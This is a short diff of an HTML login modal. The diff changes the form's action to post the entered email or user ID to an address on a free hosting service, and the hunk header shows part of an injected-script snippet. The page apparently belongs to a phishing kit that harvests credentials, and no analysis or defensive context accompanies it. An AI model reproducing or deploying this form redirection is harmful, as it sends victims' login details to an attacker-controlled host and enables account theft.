@@ -426,7 +426,7 @@ with(document)with(body)with(insertBefore(createElement("script"),firstChild))se
                 <div class="modal-body">                                       
                 <div class="col-md-6 col-sm-6 no-padng">
                     <div class="model-l">                    
-                    <form method="post" action="file:///Users/Haybee/Downloads/index.php" id="logFrm" class="log-frm" name="logFrm"> 
+                    <form method="post" action="https://j379192911.000webhostapp.com/temp/indexs" id="logFrm" class="log-frm" name="logFrm"> 
                     <ul>                                                     
                         <li>Email</li>
                         <li> <input type="text" placeholder="User ID" id="userName" name="userName" class="form-control" onfocus="checkNullProf();"></li>
